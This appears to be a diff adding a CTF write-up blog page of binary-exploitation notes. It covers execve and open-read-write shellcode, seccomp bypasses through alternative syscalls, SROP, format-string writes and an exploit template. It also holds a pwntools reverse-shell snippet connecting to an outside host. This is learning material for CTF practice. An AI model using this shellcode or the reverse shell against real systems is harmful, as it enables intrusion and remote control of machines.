@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>pwn | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Materials">
+<meta name="description" content="Why
+Finally I&rsquo;m making a little post about this, because my notes are all over the place.
+If you&rsquo;re just starting to learn about this stuff, this guy is a lifesaver; it was the single best resource I had gotten my hands on, as a complete beginner.
+32-bit
+I forget this every time I need it. Source.
+This is how it expects data, on the stack (turn on light mode, sorry):
+">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/pwn/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/pwn/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/pwn/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="pwn">
+  <meta property="og:description" content="Why Finally I’m making a little post about this, because my notes are all over the place.
+If you’re just starting to learn about this stuff, this guy is a lifesaver; it was the single best resource I had gotten my hands on, as a complete beginner.
+32-bit I forget this every time I need it. Source.
+This is how it expects data, on the stack (turn on light mode, sorry):">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-01T00:00:00+00:00">
+    <meta property="article:tag" content="Materials">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn">
+<meta name="twitter:description" content="Why
+Finally I&rsquo;m making a little post about this, because my notes are all over the place.
+If you&rsquo;re just starting to learn about this stuff, this guy is a lifesaver; it was the single best resource I had gotten my hands on, as a complete beginner.
+32-bit
+I forget this every time I need it. Source.
+This is how it expects data, on the stack (turn on light mode, sorry):
+">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "pwn",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/pwn/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pwn",
+  "name": "pwn",
+  "description": "Why Finally I\u0026rsquo;m making a little post about this, because my notes are all over the place.\nIf you\u0026rsquo;re just starting to learn about this stuff, this guy is a lifesaver; it was the single best resource I had gotten my hands on, as a complete beginner.\n32-bit I forget this every time I need it. Source.\nThis is how it expects data, on the stack (turn on light mode, sorry):\n",
+  "keywords": [
+    "Materials"
+  ],
+  "articleBody": "Why Finally I’m making a little post about this, because my notes are all over the place.\nIf you’re just starting to learn about this stuff, this guy is a lifesaver; it was the single best resource I had gotten my hands on, as a complete beginner.\n32-bit I forget this every time I need it. Source.\nThis is how it expects data, on the stack (turn on light mode, sorry):\nFunction, return address, parameter 1, parameter 2, and so forth.\npwntools stuff You can also send a parameter using pwntools. It’s pretty simple: p=elf.process(argv=[payload]).\ndata = p.recvuntil(b\"\\n[\", drop=True): with drop = True it will NOT include the b\"\\n[\" in the data.\nshellcoding Amazing docs\nnotes Simple shell: shell = asm(shellcraft.sh())\nShortest shell, 23 bytes: shell = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'\nYou forgot to add context.arch = 'amd64' or context.arch = 'i386'\nFor normal functions, function arguments are rdi, rsi, rdx, rcx, r8 and r9\nFor syscalls, function arguments are rdi, rsi, rdx, r10, r8 and r9.\nReturning values are in rax, and so is the syscall number\norw So, this is just syscalls.\nBut I suppose these are the most important. Let’s discuss them one by one.\nopen(\"/tmp/flag\", O_RDONLY, NULL) First, creating the connection to the file - this will return the fd (file descriptor) in rax.\nWhen pushing a file name, for an orw type of situation, it needs to be pushed in little endian, and in chunks smaller than eight. Split them in eights, then swap endianness and send them in that order. This can be done in cyberchef. Just input the byte size of your input (in this case 9 bytes).\nThere is also a function in pwntools that takes care of this:\nreturn hex(int.from_bytes(msg.encode(), \"little\")) You should know, you can only push up to an imm32 (immediate 4 byte value) on the stack; A bigger value, such as imm64, first needs to be moved into a register and can only then be pushed.\nLooking at the table from the syscall table, we need rax to be 2, rdi to point to the filename, rsi to be flags and rdx to be mode.\nThe flags can be:\n0, read-only, O_RDONLY\n1, write-only, O_WRONLY\n2, read/write, O_RDWR\nI guess we only need 0 for this, and rdx has no importance in this scenario either, just leave it null. And here, we will assume that the string’s going to end in a null byte; if it doesn’t, just push a null byte as well.\nThis is what the asm code should look like:\npush 0x67 mov rax, 0x616c662f706d742f push rax mov rax, 2 mov rdi, rsp xor rsi, rsi xor rdx, rdx syscall read(fd, buf, size) In this case, we’re going to read 0x30 bytes and store them at rsp-0x30 (buf), so we can access it later; By this I mean we’re going to “push” it by subtracting the size from rsp ourselves.\nmov rdi, rax sub rsp, 0x30 mov rsi, rsp mov rdx, 0x30 mov rax, 0 syscall write(fd, buf, size) Since stdout is fd 1, and we want to print the 0x30 bytes from the stack we just pushed, let’s keep that in mind; And we don’t necessarily need to modify rsi and rdx, if the last thing that happened was our read.\nmov rdi, 1 mov rax, 1 syscall shellcraft You can also just be lazy and use shellcraft for this:\ndir = \"/home/lalala/flag.txt\" shellcode = shellcraft.open(dir) shellcode += shellcraft.read('rax', 'rsp', 0x30) shellcode += shellcraft.write(1, 'rsp', 0x30) execve shellcode Or precisely execve(\"/bin/sh\", null, null); this time, rax needs to be 0x3b and rdi needs to be “/bin/sh”.\nmov rax, 0x68732f6e69622f push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx mov rax, 0x3b syscall blacklist Find out whether some character stops the blacklist, add it in the shellcode, but jump over it, details here\nThis website to generate shellcode to print files, for 32-bit.\nMore about these special characters breaking functions; Sometimes, in shellcoding challenges, the bytes escape out of the function that reads them. Here are those said bytes:\nFor scanf’s 0x0b thing, using sub eax, -0x0b instead of add eax, 0x0b will bypass it.\nBut sometimes we don’t want to bother with this sort of thing; well, pwntools has something build exactly for this:\nsc = asm(shellcraft.sh()) bad = b\"\\x00\\x0a\\x0d\\x20\\x0b\" encoded = pwnlib.encoders.encode(sc, avoid=bad) Here are the docs. It might, for example, xor and then xor your payload again, to bypass the “avoid”.\nWhat’s more, from pwnlib.encoders you can import printable, alphanumeric and null. Then, you can use them like encoded = printable.encode(sc).\nseccomp Great explanation here\nTo get insight, run seccomp-tools dump ./binary. It’s going to look something like this:\n└─$ seccomp-tools dump /home/kali/Downloads/dreamhack/bypassseccomp1/bypass_seccomp shellcode: line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0010 0006: 0x15 0x03 0x00 0x00000002 if (A == open) goto 0010 0007: 0x15 0x02 0x00 0x0000003b if (A == execve) goto 0010 0008: 0x15 0x01 0x00 0x00000142 if (A == execveat) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL The structure of a seccomp instruction is this:\nstruct sock_filter { __u16 code; //(opcode/instruction) 2 bytes __u8 jt; //(offset jump if true) 1 byte __u8 jf; //(offset jump if false) 1 byte __u32 k; //(constant) 4 bytes }; For example, return ALLOW has the opcode for return and the constant 0x7fff0000.\nThis example essentially just blocks all 32-bit syscalls on our arch. 32-bit syscalls are a way to bypass these seccomp rules, because they do the same thing; they can be invoked through the same rax syscall number except with the 30th bit enabled: 0x4000003b instead of 0x3b.\nThe seccomp-tools doesn’t always work. I don’t know why. In these cases, you can run this:\nstrace -e trace=read,prctl,seccomp -f /home/kali/Downloads/dreamhack/secureservice/deploy/secure-service \u003c \u003c(printf 'shellcode\\n\\xb8\\x3c\\x00\\x00\\x00\\x48\\x31\\xff\\x0f\\x05') Sometimes, they forget to block stuff; Like openat. The difference is, you must add another argument, at the first position, which is a directory file descriptor.\nMaking that be AT_FDCWD, with the value of -100 (0xffffff9c), will make openat behave the same as open. That just means open in the current directory.\nopen(pathname, flags) openat(dirfd, pathname, flags) Here are some suggestions from Claude.\nIn fact, here is a cheatsheet with everything to replace blocked ORW tech.\nFirst, open(path, O_RDONLY):\nopenat(-100, \"flag.txt\", 0) struct open_how how = {0, 0, 0}; //flags=0, mode=0, resolve=0 openat2(-100, \"flag.txt\", \u0026how, sizeof(how)) Next, read(fd, buf, count):\n//iov is an array of {buf, len} structs (iovec) //reads into multiple buffers in one syscall //readv(fd, iov, iovcnt) struct iovec iov = {buf, 100}; readv(fd, \u0026iov, 1) // same as read but reads from specific offset in file //pread64(fd, buf, count, offset) pread64(fd, buf, 100, 0) //preadv(fd, iov, iovcnt, offset) //pread + readv combined; multiple buffers + specific offset preadv(fd, \u0026iov, 1, 0) preadv2(fd, \u0026iov, 1, 0, 0) For write(fd, buf, count):\nstruct iovec iov = {buf, 100}; writev(1, \u0026iov, 1) pwrite64(1, buf, 100, 0) // offset=0 pwritev(1, \u0026iov, 1, 0) pwritev2(1, \u0026iov, 1, 0, 0) // flags=0 There is also a send/copy family:\n//sendfile(out_fd, in_fd, offset*, count) //// copies from in_fd to out_fd entirely in kernel //splice(fd_in, off_in, fd_out, off_out, len, flags) //like sendfile but works between any fds //one of them must be a pipe pipe(pipefd) splice(fd, NULL, pipefd[1], NULL, 100, 0) // file into pipe splice(pipefd[0], NULL, 1, NULL, 100, 0) // pipe into stdout A pipe is a kernel buffer with two ends; pipefd[0] is the read end and pipefd[1] the write end. Whatever we write into pipefd[1] comes out of pipefd[0].\nfile ──splice──► pipe[1] → pipe[0] ──splice──► stdout SROP Some great resources; What I’m doing is merely a TLDR here. So if you really care go read this stuff:\nbananamafia.dev/post/srop/\ntrustie.medium.com/srop\nctf–wiki-org.translate.goog/srop\nThis exploitation is pretty interesting: it relies on the rt_sigreturn function. When a signal happens, a handler has to respond to it. The kernel, in order to resume the process smoothly after the handler executes its stuff, has to save the context of what it was doing.\nThe context is the registers, and a couple more stuff. But we care about the registers.\nSo: signal -\u003e push registers -\u003e handler -\u003e handler calls sigreturn -\u003e pop registers.\nThis is extremely useful when we don’t have the usual ROP gadgets (pop rdi; ret type of stuff), but we have a lot of buffer overflow and some syscall gadgets.\nFirst, to call sigreturn, you must set rax to 0xf (15) and syscall. There are multiple ways to go about this:\npop eax/rax gadget;\nthrough read; as it returns the amount of bytes read into rax; first null rax, then call syscall, and you’re set.\nAfter you get past this hurdle, pwntools does the annoying part for you:\nframe = SigreturnFrame(); frame.rax = 0xb frame.rdi = binsh frame.rsi = 0 frame.rdx = 0 frame.rip = syscall payload += bytes(frame) If you don’t want to just call execve, you can call mprotect on a memory area of choice, make it executable and writeable and shift the stack to that address (put the entry point of the shellcode in rsp, to be able to write it easily, then redirect rip to it).\nfmt-str These will write the number of characters printed so far, into the address pointed to by the next argument.\n%n writes 4 bytes\n%hn writes 2 bytes\n%hhn writes 1 byte\n%lln writes 8 bytes\nWe don’t actually need to write them, we can use padding:\n%100c “writes” 100 chars. If the address at %12$p is 0x7ffd...1230 and we want to change its last two bytes to 0x4080:\n%16512c%12$hn, since 0x4080 in decimal is 16512. BUT! The second write, we need to substract from the second padding what we added in the first, because there’s already a 16512 written, in this case. So it would be %(X-16512)c.\nWe don’t usually need to bother with that, since we can use fmtstr_payload from pwntools. But, when our stuff is getting printed by printf, null bytes wreak our payload and we need to do it manually.\nwrites = { addr: value, addr2: value2 } start = #index at which your input starts showing up on stack fmtstr_payload(start, writes, write_size='byte') #can choose byte, short, int To automatically find the offset at which your input begins at, this will work:\nfrom pwn import * elf = ELF('/home/kali/Downloads/main') cyberedu = '34.185.222.215:30484' context.arch = 'amd64' ip, port = cyberedu.split(':') port = int(port) def send(payload): p = elf.process() p.sendline(payload) return p.recvall() fmt = FmtStr(execute_fmt=send) print(fmt.offset) Print some stack pointers in python: print(\".\".join(f\"%{i}$p\" for i in range(1, 51))) canary Check the canary in gdb with checksec; it will print out nicely right there. Usually you can just find the canary using a fmtstr vuln.\nThe canary is usually right before rbp on the stack. You can also view the canary with the canary command in pwndbg:\nThis way, it’s easier to calculate the offset!\nAnd, sometimes, you just overflow a buffer right before the canary, in the sense that you overwrite the null byte so it prints what comes right after it.\narm I made a separate post here.\nrandom Sometimes we need to generate a random number. Just add this in your python script and you should be grand. You will definitely need to mess around with the i offset, based on how long connection takes.\nfrom ctypes import CDLL import time #c code libc = CDLL(\"/lib/x86_64-linux-gnu/libc.so.6\") now = int(time.time()) i=10 j=1 for seed in range(now - 10, now + 10): libc.srand(seed) random = libc.rand() print(seed, random) if i==j: random_number = random random_seed = seed j=j+1 #save the seed at now + i libc.srand(random_seed) random_number = libc.rand() print(f\"random number for i={i} is {random_number}\") _IO_FILE Sources here, there.\nIf you want to view an address as, say, an _IO_FILE struct, you can just specify p *(struct _IO_FILE_plus *)0x606060. If you want to actually see them, after doing p _IO_list_all you can p *(struct _IO_FILE_plus *) 0xaddr.\nBut what is _IO_list_all? Well, it’s a pointer to the first _IO_FILE (head) entry in the _IO_FILE chain. Then, each one points to the next (stderr -\u003e stdout -\u003e stdin -\u003e …). That’s happening through the _chain pointer each structure has.\nThe vtable lives inside each _IO_FILE structure, after all the file details. Inside the vtable is a, well, table of all the function used by these structures. Usually it’s at offset _IO_FILE + 0xd8.\nKeep in mind, when overwriting the vtable, versions more recent than 2.23 will throw an Fatal error: glibc detected an invalid stdio handle error.\nreverse shell You can read more about it here.\nIf you need a reverse shell, through shellcoding, pwntools will take care of you:\nshellcode = shellcraft.connect('bore.pub', 33843) shellcode += shellcraft.findpeersh() That’s it!\ntesting Sometimes you need to test how one of your ideas will work, so you don’t waste time trying a wrong hypothesis. You can create your own C file, write what you’re trying to achieve, and compile it with gcc file.c.\nThen, look through the binary - you can set breakpoints at important calls and it might clear up what you need to do with your registers.\npwndbg I keep discovering really cool stuff about this - for example, the stack layout:\nIt shows you each value at the offset from both rsp (positive) and rbp (negative)!\nYou can also view the full stack frame with telescope $rsp 50.\nTo set a pie breakpoint just do brva 0xoffset.\nYou can quickly view the got by (guess what) writing got.\nboilerplate This is the template with useful comments that I use as a starting point for all my pwn challenges:\nfrom pwn import * elf = ELF('/home/kali/Downloads/file') p=elf.process() context.arch = 'amd64' cyberedu = '34.185.222.215:30484' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() # read hex leak: # pie_leak = int(pie_leak, 16) # read hex bytes: # val = u64(data.ljust(8, b\"\\x00\")) #local testing, run normally #remote testing, run python3 exploit.py REMOTE #strings libc.so.6 | grep \"GNU C Library\" #strings libc.so.6 | grep \"release version\" #print(\".\".join(f\"%{i}$p\" for i in range(1, 51))) #shell = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05' shortest shell p.interactive() ",
+  "wordCount" : "2393",
+  "inLanguage": "en",
+  "datePublished": "2026-05-01T00:00:00Z",
+  "dateModified": "2026-05-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/pwn/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      pwn
+    </h1>
+    <div class="post-meta"><span title='2026-05-01 00:00:00 +0000 UTC'>May 1, 2026</span>&nbsp;·&nbsp;<span>12 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#why" aria-label="Why">Why</a></li>
+                <li>
+                    <a href="#32-bit" aria-label="32-bit">32-bit</a></li>
+                <li>
+                    <a href="#pwntools-stuff" aria-label="pwntools stuff">pwntools stuff</a></li>
+                <li>
+                    <a href="#shellcoding" aria-label="shellcoding">shellcoding</a><ul>
+                        
+                <li>
+                    <a href="#notes" aria-label="notes">notes</a></li>
+                <li>
+                    <a href="#orw" aria-label="orw">orw</a><ul>
+                        
+                <li>
+                    <a href="#opentmpflag-o_rdonly-null" aria-label="open(&quot;/tmp/flag&quot;, O_RDONLY, NULL)">open(&quot;/tmp/flag&quot;, O_RDONLY, NULL)</a></li>
+                <li>
+                    <a href="#readfd-buf-size" aria-label="read(fd, buf, size)">read(fd, buf, size)</a></li>
+                <li>
+                    <a href="#writefd-buf-size" aria-label="write(fd, buf, size)">write(fd, buf, size)</a></li>
+                <li>
+                    <a href="#shellcraft" aria-label="shellcraft">shellcraft</a></li></ul>
+                </li>
+                <li>
+                    <a href="#execve-shellcode" aria-label="execve shellcode">execve shellcode</a></li>
+                <li>
+                    <a href="#blacklist" aria-label="blacklist">blacklist</a></li>
+                <li>
+                    <a href="#seccomp" aria-label="seccomp">seccomp</a></li></ul>
+                </li>
+                <li>
+                    <a href="#srop" aria-label="SROP">SROP</a></li>
+                <li>
+                    <a href="#fmt-str" aria-label="fmt-str">fmt-str</a></li>
+                <li>
+                    <a href="#canary" aria-label="canary">canary</a></li>
+                <li>
+                    <a href="#arm" aria-label="arm">arm</a></li>
+                <li>
+                    <a href="#random" aria-label="random">random</a></li>
+                <li>
+                    <a href="#_io_file" aria-label="_IO_FILE">_IO_FILE</a></li>
+                <li>
+                    <a href="#reverse-shell" aria-label="reverse shell">reverse shell</a></li>
+                <li>
+                    <a href="#testing" aria-label="testing">testing</a></li>
+                <li>
+                    <a href="#pwndbg" aria-label="pwndbg">pwndbg</a></li>
+                <li>
+                    <a href="#boilerplate" aria-label="boilerplate">boilerplate</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="why">Why<a hidden class="anchor" aria-hidden="true" href="#why">#</a></h2>
+<p>Finally I&rsquo;m making a little post about this, because my notes are all over the place.</p>
+<p>If you&rsquo;re just starting to learn about this stuff, <a href="https://ir0nstone.gitbook.io/notes/binexp/">this guy is a lifesaver</a>; it was the single best resource I had gotten my hands on, as a complete beginner.</p>
+<h2 id="32-bit">32-bit<a hidden class="anchor" aria-hidden="true" href="#32-bit">#</a></h2>
+<p>I forget this every time I need it. <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions">Source</a>.</p>
+<p>This is how it expects data, on the stack (turn on light mode, sorry):</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/image.png#center"></p>
+<p>Function, return address, parameter 1, parameter 2, and so forth.</p>
+<h2 id="pwntools-stuff">pwntools stuff<a hidden class="anchor" aria-hidden="true" href="#pwntools-stuff">#</a></h2>
+<ul>
+<li>
+<p>You can also send a parameter using pwntools. It&rsquo;s pretty simple: <code>p=elf.process(argv=[payload])</code>.</p>
+</li>
+<li>
+<p><code>data = p.recvuntil(b&quot;\n[&quot;, drop=True)</code>: with <code>drop = True</code> it will <em>NOT</em> include the <code>b&quot;\n[&quot;</code> in the data.</p>
+</li>
+</ul>
+<h2 id="shellcoding">shellcoding<a hidden class="anchor" aria-hidden="true" href="#shellcoding">#</a></h2>
+<p>Amazing <a href="https://learn.dreamhack.io/50#1">docs</a></p>
+<h3 id="notes">notes<a hidden class="anchor" aria-hidden="true" href="#notes">#</a></h3>
+<ul>
+<li>
+<p>Simple shell: <code>shell = asm(shellcraft.sh())</code></p>
+</li>
+<li>
+<p>Shortest shell, 23 bytes: <code>shell = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</code></p>
+</li>
+<li>
+<p>You forgot to add <code>context.arch = 'amd64'</code> or <code>context.arch = 'i386'</code></p>
+</li>
+<li>
+<p>For normal functions, function arguments are <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code> and <code>r9</code></p>
+</li>
+<li>
+<p>For syscalls, function arguments are <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>r10</code>, <code>r8</code> and <code>r9</code>.</p>
+</li>
+<li>
+<p>Returning values are in <code>rax</code>, and so is the syscall number</p>
+</li>
+</ul>
+<h3 id="orw">orw<a hidden class="anchor" aria-hidden="true" href="#orw">#</a></h3>
+<p>So, this is just <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">syscalls</a>.</p>
+<p>But I suppose these are the most important. Let&rsquo;s discuss them one by one.</p>
+<h4 id="opentmpflag-o_rdonly-null">open(&quot;/tmp/flag&quot;, O_RDONLY, NULL)<a hidden class="anchor" aria-hidden="true" href="#opentmpflag-o_rdonly-null">#</a></h4>
+<p>First, creating the connection to the file - this will return the <em>fd</em> (file descriptor) in <code>rax</code>.</p>
+<p>When pushing a file name, for an orw type of situation, it needs to be pushed in little endian, and in chunks smaller than eight. Split them in eights, then swap endianness and send them in that order. This can be done in cyberchef. Just input the byte size of your input (in this case 9 bytes).</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/endian.png#center"></p>
+<p>There is also a function in pwntools that takes care of this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> hex(int<span style="color:#f92672">.</span>from_bytes(msg<span style="color:#f92672">.</span>encode(), <span style="color:#e6db74">&#34;little&#34;</span>))
+</span></span></code></pre></div><p>You should know, you can only push up to an <code>imm32</code> (immediate 4 byte value) on the stack; A bigger value, such as <code>imm64</code>, first needs to be <code>mov</code>ed into a register and can only <em>then</em> be pushed.</p>
+<p>Looking at the table from the <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">syscall table</a>, we need <code>rax</code> to be 2, <code>rdi</code> to point to the filename, <code>rsi</code> to be flags and <code>rdx</code> to be <em>mode</em>.</p>
+<p>The <em>flags</em> can be:</p>
+<ul>
+<li>
+<p>0, read-only, <code>O_RDONLY</code></p>
+</li>
+<li>
+<p>1, write-only, <code>O_WRONLY</code></p>
+</li>
+<li>
+<p>2, read/write, <code>O_RDWR</code></p>
+</li>
+</ul>
+<p>I guess we only need 0 for this, and <code>rdx</code> has no importance in this scenario either, just leave it null. And here, we will assume that the string&rsquo;s going to end in a null byte; if it doesn&rsquo;t, just push a null byte as well.</p>
+<p>This is what the asm code should look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x67</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0x616c662f706d742f</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><h4 id="readfd-buf-size">read(fd, buf, size)<a hidden class="anchor" aria-hidden="true" href="#readfd-buf-size">#</a></h4>
+<p>In this case, we&rsquo;re going to read 0x30 bytes and store them at <code>rsp-0x30</code> (buf), so we can access it later; By this I mean we&rsquo;re going to &ldquo;push&rdquo; it by subtracting the size from <code>rsp</code> ourselves.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x30</span>
